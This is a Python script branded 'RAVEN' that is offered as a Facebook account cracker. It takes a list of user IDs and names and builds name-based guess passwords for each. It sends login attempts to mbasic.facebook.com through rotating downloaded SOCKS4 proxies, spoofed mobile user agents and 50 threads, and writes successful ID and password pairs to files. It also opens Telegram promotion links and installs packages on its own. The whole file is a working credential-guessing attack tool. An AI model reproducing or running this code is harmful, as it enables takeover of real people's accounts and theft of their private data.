import os
try:
    import requests
except ImportError:
    print('\n [×] requests module not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Futures module not installed!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Bs4 module not installed!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64
from concurrent.futures import ThreadPoolExecutor as AzimVau
from datetime import datetime
from bs4 import BeautifulSoup
def xoshnaw():
  uuid = str(os.geteuid()) + str(os.getlogin())

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import webbrowser
pretty.install()
CON=sol()
#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
os.system("pip install marshal")
try:
	prox= requests.get('https://github.com/DFD4x/TOOLxFB/blob/main/.DFD-IP.txt').text
	open('.DFD-IP.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.DFD-IP.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('DFD-MOBILE.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/HamaCracker1/List/blob/main/list.txt').text
		ua=open('.DFD-MOBILE.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.DFD-MOBILE.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
# COLOUR 
webbrowser.open('https://t.me/b14v_0')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
import marshal
def banner():
	clear()
	print(f"""
\x1b[1;35m
\x1b[1;94m



      :::::::::      :::     :::     ::: :::::::::: ::::    ::: 
     :+:    :+:   :+: :+:   :+:     :+: :+:        :+:+:   :+:  
    +:+    +:+  +:+   +:+  +:+     +:+ +:+        :+:+:+  +:+   
   +#++:++#:  +#++:++#++: +#+     +:+ +#++:++#   +#+ +:+ +#+    
  +#+    +#+ +#+     +#+  +#+   +#+  +#+        +#+  +#+#+#     
 #+#    #+# #+#     #+#   #+#+#+#   #+#        #+#   #+#+#      
###    ### ###     ###     ###     ########## ###    ####       



                                                     
\033[0;33m oooooooooooooooooooooooooooooooooooooooooooooooooooooooo                                                                                              
\033[0;34m╔══\033[0;32m[•] OWNER         \033[0;34m╔══\033[0;32m[•] RAVEN
\033[0;34m╠══\033[0;91m[•] CH            \033[0;34m╠══\033[0;91m[•] @b14v_0
\033[0;34m╚══\033[0;32m[•] BRO           \033[0;34m╚══\033[0;32m[•] @ [BEST]""")
# LOGIN
# new cooki 
def login():
	os.system('clear')
	banner()
		
	
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "".join(uuid)
	
	print("")
	print ('\033[1;33m~~~~~~~~~~Menu Cracking~~~~~~~~~~\033[0;97m')
	print('\033[1;34m%s\033[1;36m[] %s%s%s \033[1;32m└\033[1;32m[1] [File Clone] %s%s%s'%(P,H,P,H,P,H,P))
	print('\033[1;34m%s\033[1;36m[] %s%s%s \033[1;35m└\033[1;32m[0] [Exit] %s%s%s'%(P,H,P,H,P,H,P))
	print ('\033[1;33m~~~~~~~~~~Menu Cracking~~~~~~~~~~\033[0;97m')
	dark = input('%s%s%s%s\033[1;36m└\033[1;32m[] [CHOOSE]%s\033[1;31m : '%(N,H,N,H,M))
	print('')
	if dark in ['1','01']:
		crack_file()
	elif dark in ['0','00']:
		print(' [OK] LOGIN ACCOUNT ')
		exit()
# PUBLIC CRACK

def crack_file():
	o = input('\033[1;33m└\033[1;31m[] [File Name] : \033[1;32m')
	webbrowser.open('https://t.me/b14v_0')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		menu()
	for xid in lin:
		id.append(xid)
	setting()
#-------------[ -SETTING ]---------------#
def setting():
	banner()
	webbrowser.open('https://t.me/zZKgz')
	print(' \033[1;36m└\033[1;32m[] [TOTAL ID] : '+str(len(id)))
	#print(' [1] RANDOM ')
	print("")

	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\n\n')
		exit()
	banner()
	print('[01] WI-FI 2G 3G 4G 5G ')
	print("")
	method.append('mobile')
	banner()
	print("""
	\033[1;36m└\033[1;32m[] \033[1;33m└[Method] [1]
	\033[1;36m└\033[1;32m[] \033[1;36m└[Method] [2] """)
	dark = input(' \033[1;36m└\033[1;32m[] [CHOOSE] : \033[1;31m└')
	if dark in ['01','1']:
		passwrd()
	if dark in ['02','2']:
		passwrd3()
	exit() 
# Method Main
def passwrd():
	banner()
	webbrowser.open('https://t.me/zzKgZ')
	print("")
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
			else:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					
#webbrowser.open('https://t.me/b14v_0')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd1():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					
			else:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					

			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd2():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=20) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(nmf)
			else:
					pwv.append(nmf)
					pwv.append(nmf)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd3():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
			else:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd4():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
			else:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')

			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd5():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
			else:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd7():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
			else:
					pwv.append(nmf)
					pwv.append("07700770")
					pwv.append("07500750")
					pwv.append(frs+'123')
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'112233')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456789')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'2000')
					pwv.append(frs+'0000')
					pwv.append(frs+'0750')
					pwv.append(frs+'0770')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'12345678')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')

			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
#webbrowser.open('https://t.me/b14v_0') 
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \033[1;36m[RAVEN]└[{loop}\033[1;33m/\033[1;32m{len(id)}]  \033[1;32m└LIVE ๛  \033[1;30m{ok}  \033[1;32m└CP ๛  \033[1;30m{cp}  {bo}\033[1;36m{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://www.google.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				
				
				print(f'\r\033[1;32m└[ RAVEN✅OK ]\n \033[1;35mACCOUNT💚USER : {idf}   [+] ACCOUNT PASS💚 : {pw}                     @b14v_0')
	#
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\033[1;32m└[ RAVEN✅OK ]\n \033[1;35mACCOUNT💚USER : {idf}   [+] ACCOUNT PASS💚 : {pw}                           @b14v_0 ')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#ooooooooo[𝗥𝗔𝗩𝗘𝗡]ooooooooooo#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch LOL-IP.txt')
	except:pass
	try:os.system('touch LOL-IP.txt')
	except:pass
	login() #𝗥𝗔𝗩𝗘𝗡
